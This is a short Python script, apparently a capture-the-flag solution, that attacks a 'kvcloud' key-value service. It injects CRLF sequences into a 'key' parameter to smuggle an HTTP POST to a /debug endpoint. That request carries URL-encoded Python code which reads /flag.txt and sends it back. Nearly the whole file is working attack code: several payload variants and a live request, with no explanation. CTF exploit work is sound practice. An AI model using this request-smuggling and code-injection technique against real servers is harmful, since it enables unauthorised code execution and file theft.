import requests

url = b'http://0.0.0.0/get?key=http://0.0.0.0:8000 HTTP/1.1%0AHost: localhost%0A%0APOST https://0.0.0.0/debug HTTP/1.1%0AHost:localhostContent-Type: application/x-www-form-urlencoded%0AContent-Length: 249cmd=%0A%0Aimport%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28NEWLINE%20%2B%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29&redis_port=80'
url3 = b'http://kvcloud.sf.ctf.so/get?key=http://kvcloud.sf.ctf.so/ HTTP/1.1%0AHost: localhost%0A%0APOST https://kvcloud.sf.ctf.so/debug HTTP/1.1%0AHost:localhost%0Akeep-Alive: timeout=30,max=1000%0AContent-Type: application/x-www-form-urlencoded%0AContent-Length: 249%0A%0Acmd=%0A%0Aimport%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29&redis_port=80'
# payload={'cmd': 'import%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28NEWLINE%20%2B%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29'}
url2 = b'http://kvcloud.ny.ctf.so/get'

payload={'cmd': 'import%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28NEWLINE%20%2B%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29'}
headers = {
  'Host': 'kvcloud.ny.ctf.so',
  'keep-Alive': 'timeout=31,max=1000'
}
params = {'redis_port':'80','key':'/debug POST /debug HTTP/1.1%0AHost:localhost%0Akeep-Alive: timeout=30,max=1000%0AContent-Type: application/x-www-form-urlencoded%0AContent-Length: 251%0A%0Acmd=import%20io%3B%20from%20flask%20import%20send_file%3B%20with%20open%28%5C%27%2Fflag.txt%5C%27%2C%20%5C%27rb%5C%27%29%20as%20f%3A%20fdata%20%3D%20io.BytesIO%28NEWLINE%20%2B%20f.read%28%29%29%3B%20send_file%28fdata%2C%20%5C%27text%2Fplain%5C%27%29'}
response = requests.request("GET", url2, headers=headers,params=params, data=payload)

print(response.text)

